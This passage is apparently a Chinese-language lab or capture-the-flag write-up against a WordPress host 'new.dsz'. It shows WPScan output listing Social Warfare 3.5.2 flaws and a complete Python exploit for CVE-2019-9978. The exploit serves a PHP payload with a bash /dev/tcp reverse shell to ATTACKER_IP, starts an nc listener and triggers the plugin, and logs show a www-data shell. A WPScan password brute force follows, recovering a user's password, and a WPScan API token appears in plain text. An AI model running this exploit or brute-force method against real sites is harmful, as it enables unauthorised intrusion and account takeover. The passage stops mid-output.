|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1959<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1016f16c-0ab2-4cac-a7a5-8d93a37e7894<br> |<br> | [!] Title: Social Sharing Plugin – Social Warfare &lt; 4.4.6 - Cross-Site Request Forgery<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.6<br> |     References:<br> |      - https://wpscan.com/vulnerability/acb8b33c-6b74-4d65-a3a5-5cad0c1ea8b0<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34825<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f105bee6-21b2-4014-bb0a-9e53c49e29b0<br> |<br> | [!] Title: Social Warfare &lt; 4.5.6 - Contributor+ Stored XSS<br> |     Fixed <span class="hljs-keyword">in</span>: 4.5.6<br> |     References:<br> |      - https://wpscan.com/vulnerability/447065f5-f2f9-4e0c-b524-c730655f3d79<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-26973<br> |      - https://patchstack.com/database/wordpress/plugin/social-warfare/vulnerability/wordpress-social-warfare-plugin-4-5-4-cross-site-scripting-xss-vulnerability<br> |<br> | Version: 3.5.2 (100% confidence)<br> | Found By: Comment (Passive Detection)<br> |  - http://new.dsz/, Match: <span class="hljs-string">&#x27;Social Warfare v3.5.2&#x27;</span><br> | Confirmed By:<br> |  Query Parameter (Passive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2<br> |   - http://new.dsz/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2<br> |  Readme - Stable Tag (Aggressive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/readme.txt<br> |  Readme - ChangeLog Section (Aggressive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/readme.txt<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;=================================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] maze-sec<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://new.dsz/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Rss Generator (Aggressive Detection)<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] todd<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] hyh<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] sublarge<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] WPScan DB API OK<br> | Plan: free<br> | Requests Done (during the scan): 4<br> | Requests Remaining: 17<br><br>[+] Finished: Wed Jul  2 21:11:46 2025<br>[+] Requests Done: 69<br>[+] Cached Requests: 8<br>[+] Data Sent: 18.079 KB<br>[+] Data Received: 703.923 KB<br>[+] Memory used: 277.141 MB<br>[+] Elapsed <span class="hljs-keyword">time</span>: 00:00:16<br></code></pre></td></tr></table></figure>
+<p>找到一个漏洞<code>Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Remote Code Execution (RCE)</code></p>
+<h2 id="2、Getshell"><a href="#2、Getshell" class="headerlink" title="2、Getshell"></a>2、Getshell</h2><h3 id="1-CVE-2019-9978漏洞利用"><a href="#1-CVE-2019-9978漏洞利用" class="headerlink" title="1-CVE-2019-9978漏洞利用"></a>1-CVE-2019-9978漏洞利用</h3><p>该 版 本<code> Social Warfare v3.5.2</code> 存 在<code> CVE-2019-9978</code> 漏 洞<br><code>https: //www.exploit-db.com/exploits/52346</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment"># Exploit Title: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)</span><br><span class="hljs-comment"># Date: 25-06-2025</span><br><span class="hljs-comment"># Exploit Author: Huseyin Mardini (@housma)</span><br><span class="hljs-comment"># Original Researcher: Luka Sikic</span><br><span class="hljs-comment"># Original Exploit Author: hash3liZer</span><br><span class="hljs-comment"># Vendor Homepage: https://wordpress.org/plugins/social-warfare/</span><br><span class="hljs-comment"># Software Link: https://downloads.wordpress.org/plugin/social-warfare.3.5.2.zip</span><br><span class="hljs-comment"># Version: &lt;= 3.5.2</span><br><span class="hljs-comment"># CVE: CVE-2019-9978</span><br><span class="hljs-comment"># Tested On: WordPress 5.1.1 with Social Warfare 3.5.2 (on Ubuntu 20.04)</span><br><span class="hljs-comment"># Python Version: Python 3.x</span><br><span class="hljs-comment"># Reference: https://www.exploit-db.com/exploits/46794</span><br><span class="hljs-comment"># Github (original PoC): https://github.com/hash3liZer/CVE-2019-9978</span><br><br><span class="hljs-comment"># The currently listed exploit for *CVE-2019-9978* (Exploit ID 46794&lt;https://www.exploit-db.com/exploits/46794&gt;) appears to no longer work as intended in many modern environments</span><br><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#   1. Edit the config section below and replace `ATTACKER_IP` with your machine&#x27;s IP.</span><br><span class="hljs-comment">#   2. Run the script: `python3 exploit.py`</span><br><span class="hljs-comment">#   3. It will:</span><br><span class="hljs-comment">#       - Create a PHP payload and save it as `payload.txt` (or any filename you set in PAYLOAD_FILE)</span><br><span class="hljs-comment">#       - Start an HTTP server on `HTTP_PORT` to host the payload</span><br><span class="hljs-comment">#       - Start a Netcat listener on `LISTEN_PORT`</span><br><span class="hljs-comment">#       - Trigger the vulnerability via the vulnerable `swp_debug` parameter</span><br><span class="hljs-comment">#   4. On success, you get a reverse shell as `www-data`.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Note:</span><br><span class="hljs-comment">#   - PAYLOAD_FILE defines only the name of the file to be created and served.</span><br><span class="hljs-comment">#   - Make sure ports 8001 and 4444 are open and not in use.</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> http.server<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># --- Config ---</span><br>TARGET_URL = <span class="hljs-string">&quot;http://example.com&quot;</span> <span class="hljs-comment"># Change to your attack wordpress</span><br>ATTACKER_IP = <span class="hljs-string">&quot;xxx.xxx.xx.xx&quot;</span>  <span class="hljs-comment"># Change to your attack box IP</span><br>HTTP_PORT = <span class="hljs-number">8000</span><br>LISTEN_PORT = <span class="hljs-number">4444</span><br>PAYLOAD_FILE = <span class="hljs-string">&quot;payload.txt&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_payload</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Write exact reverse shell payload using valid PHP syntax&quot;&quot;&quot;</span><br>    payload = <span class="hljs-string">f&#x27;&lt;pre&gt;system(&quot;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">&#123;ATTACKER_IP&#125;</span>/<span class="hljs-subst">&#123;LISTEN_PORT&#125;</span> 0&gt;&amp;1\\&quot;&quot;)&lt;/pre&gt;&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(PAYLOAD_FILE, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Payload written to <span class="hljs-subst">&#123;PAYLOAD_FILE&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_http_server</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Serve payload over HTTP&quot;&quot;&quot;</span><br>    handler = http.server.SimpleHTTPRequestHandler<br>    <span class="hljs-keyword">with</span> socketserver.TCPServer((<span class="hljs-string">&quot;&quot;</span>, HTTP_PORT), handler) <span class="hljs-keyword">as</span> httpd:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] HTTP server running at port <span class="hljs-subst">&#123;HTTP_PORT&#125;</span>&quot;</span>)<br>        httpd.serve_forever()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_listener</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Start Netcat listener&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Listening on port <span class="hljs-subst">&#123;LISTEN_PORT&#125;</span> for reverse shell...&quot;</span>)<br>    subprocess.call([<span class="hljs-string">&quot;nc&quot;</span>, <span class="hljs-string">&quot;-lvnp&quot;</span>, <span class="hljs-built_in">str</span>(LISTEN_PORT)])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_exploit</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Trigger the exploit with vulnerable parameter&quot;&quot;&quot;</span><br>    payload_url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;ATTACKER_IP&#125;</span>:<span class="hljs-subst">&#123;HTTP_PORT&#125;</span>/<span class="hljs-subst">&#123;PAYLOAD_FILE&#125;</span>&quot;</span><br>    exploit = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=<span class="hljs-subst">&#123;payload_url&#125;</span>&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Sending exploit: <span class="hljs-subst">&#123;exploit&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        requests.get(exploit, timeout=<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    create_payload()<br><br>    <span class="hljs-comment"># Start web server in background</span><br>    http_thread = threading.Thread(target=start_http_server, daemon=<span class="hljs-literal">True</span>)<br>    http_thread.start()<br>    time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># Give server time to start</span><br><br>    <span class="hljs-comment"># Start listener in background</span><br>    listener_thread = threading.Thread(target=start_listener)<br>    listener_thread.start()<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># Send the malicious request</span><br>    send_exploit()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        main()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Interrupted by user.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>修改目标地址和本机IP后，直接使用脚本运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec]<br>└─# vi exploit.py<br><br>┌──(root㉿kali)-[/miao/maze-sec]<br>└─# python3 exploit.py        <br>[+] Payload written to payload.txt<br>[+] HTTP server running at port 8000<br>[+] Listening on port 4444 <span class="hljs-keyword">for</span> reverse shell...<br>listening on [any] 4444 ...<br>[+] Sending exploit: http://new.dsz/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://192.168.2.4:8000/payload.txt<br>192.168.2.43 - - [02/Jul/2025 21:38:53] <span class="hljs-string">&quot;GET /payload.txt?swp_debug=get_user_options HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>
+
+<p>成功获取到<code>www-data</code>的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# nc -lvnp 4444        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.43] 55424<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (471): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@New:/var/www/new.dsz/wp-admin$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-Wordpress密码爆破"><a href="#2-Wordpress密码爆破" class="headerlink" title="2-Wordpress密码爆破"></a>2-Wordpress密码爆破</h3><p>根据<code>wpscan</code>扫描到的用户<code>maze-sec</code>，<code>todd</code>，<code>hyh</code>，<code>sublarge</code>，尝试进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# bash generate_by_username.sh sublarge &gt; pass .txt<br><br>┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# wpscan --url http://new.dsz/ --api-token Jrh7ozpao7LtkyqVZwMeXCKeqJN0zHplyeG8SaQU124 -U sublarge -P pass.txt <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.27<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[+] URL: http://new.dsz/ [192.168.2.43]<br>[+] Started: Wed Jul  2 22:53:39 2025<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.62 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] robots.txt found: http://new.dsz/robots.txt<br> | Interesting Entries:<br> |  - /wp-admin/<br> |  - /wp-admin/admin-ajax.php<br> | Found By: Robots Txt (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://new.dsz/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://new.dsz/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://new.dsz/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://new.dsz/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;<br> |  - http://new.dsz/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentytwentyfive<br> | Location: http://new.dsz/wp-content/themes/twentytwentyfive/<br> | Latest Version: 1.2 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2025-04-15T00:00:00.000Z<br> | Readme: http://new.dsz/wp-content/themes/twentytwentyfive/readme.txt<br> | Style URL: http://new.dsz/wp-content/themes/twentytwentyfive/style.css?ver=1.2<br> | Style Name: Twenty Twenty-Five<br> | Style URI: https://wordpress.org/themes/twentytwentyfive/<br> | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> | Confirmed By: Css Style In 404 Page (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://new.dsz/wp-content/themes/twentytwentyfive/style.css?ver=1.2, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] *<br> | Location: http://new.dsz/wp-content/plugins/*/<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By: Urls In 404 Page (Passive Detection)<br> |<br> | The version could not be determined.<br><br>[+] social-warfare<br> | Location: http://new.dsz/wp-content/plugins/social-warfare/<br> | Last Updated: 2025-03-18T09:37:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 4.5.6<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> | Confirmed By:<br> |  Urls In 404 Page (Passive Detection)<br> |  Comment (Passive Detection)<br> |<br> | [!] 8 vulnerabilities identified:<br> |<br> | [!] Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Arbitrary Settings Update<br> |     Fixed <span class="hljs-keyword">in</span>: 3.5.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/32085d2d-1235-42b4-baeb-bc43172a4972<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9978<br> |      - https://wordpress.org/support/topic/malware-into-new-update/<br> |      - https://www.wordfence.com/blog/2019/03/unpatched-zero-day-vulnerability-in-social-warfare-plugin-exploited-in-the-wild/<br> |      - https://threatpost.com/wordpress-plugin-removed-after-zero-day-discovered/143051/<br> |      - https://twitter.com/warfareplugins/status/1108826025188909057<br> |      - https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/<br> |<br> | [!] Title: Social Warfare &lt;= 3.5.2 - Unauthenticated Remote Code Execution (RCE)<br> |     Fixed <span class="hljs-keyword">in</span>: 3.5.3<br> |     References:<br> |      - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618<br> |      - https://www.webarxsecurity.com/social-warfare-vulnerability/<br> |<br> | [!] Title: Social Warfare &lt; 4.3.1 - Subscriber+ Post Meta Deletion<br> |     Fixed <span class="hljs-keyword">in</span>: 4.3.1<br> |     References:<br> |      - https://wpscan.com/vulnerability/5116068f-4b84-42ad-a88d-03e46096b41c<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0402<br> |<br> | [!] Title: Social Warfare &lt; 4.4.0 - Post Meta Deletion via CSRF<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.0<br> |     References:<br> |      - https://wpscan.com/vulnerability/7140abf5-5966-4361-bd51-ee29d3071a30<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0403<br> |<br> | [!] Title: Social Sharing Plugin - Social Warfare &lt; 4.4.4 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.4<br> |     References:<br> |      - https://wpscan.com/vulnerability/ab221b58-369e-4010-ae36-be099b2f4c9b<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4842<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f5b9aff-0833-4887-ae59-df5bc88c7f91<br> |<br> | [!] Title: Social Sharing Plugin – Social Warfare &lt; 4.4.6.2 - Authenticated(Contributor+) Stored Cross-Site Scripting via Shortcode<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.6.2<br> |     References:<br> |      - https://wpscan.com/vulnerability/26ad138e-990a-4401-84e4-ea694ccf6e7f<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1959<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1016f16c-0ab2-4cac-a7a5-8d93a37e7894<br> |<br> | [!] Title: Social Sharing Plugin – Social Warfare &lt; 4.4.6 - Cross-Site Request Forgery<br> |     Fixed <span class="hljs-keyword">in</span>: 4.4.6<br> |     References:<br> |      - https://wpscan.com/vulnerability/acb8b33c-6b74-4d65-a3a5-5cad0c1ea8b0<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34825<br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f105bee6-21b2-4014-bb0a-9e53c49e29b0<br> |<br> | [!] Title: Social Warfare &lt; 4.5.6 - Contributor+ Stored XSS<br> |     Fixed <span class="hljs-keyword">in</span>: 4.5.6<br> |     References:<br> |      - https://wpscan.com/vulnerability/447065f5-f2f9-4e0c-b524-c730655f3d79<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-26973<br> |      - https://patchstack.com/database/wordpress/plugin/social-warfare/vulnerability/wordpress-social-warfare-plugin-4-5-4-cross-site-scripting-xss-vulnerability<br> |<br> | Version: 3.5.2 (100% confidence)<br> | Found By: Comment (Passive Detection)<br> |  - http://new.dsz/, Match: <span class="hljs-string">&#x27;Social Warfare v3.5.2&#x27;</span><br> | Confirmed By:<br> |  Query Parameter (Passive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2<br> |   - http://new.dsz/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2<br> |  Readme - Stable Tag (Aggressive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/readme.txt<br> |  Readme - ChangeLog Section (Aggressive Detection)<br> |   - http://new.dsz/wp-content/plugins/social-warfare/readme.txt<br><br>[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups - Time: 00:00:02 &lt;================================================================&gt; (137 / 137) 100.00% Time: 00:00:02<br><br>[i] No Config Backups Found.<br><br>[+] Performing password attack on Xmlrpc against 1 user/s<br>Trying sublarge / sublarge2025 Time: 00:00:00 &lt;================================================================&gt; (1 / 1) 100.00% Time: 00:00:00<br>Trying sublarge / sublarge2025 Time: 00:00:00 &lt;================================                                 &gt; (1 / 2) 50.00%  ETA: ??:??:??<br>[SUCCESS] - sublarge / sublarge2025                                                                                                            <br><br>[!] Valid Combinations Found:<br> | Username: sublarge, Password: sublarge2025<br><br>[+] WPScan DB API OK<br> | Plan: free<br> | Requests Done (during the scan): 4<br> | Requests Remaining: 13<br><br>[+] Finished: Wed Jul  2 22:53:57 2025<br>[+] Requests Done: 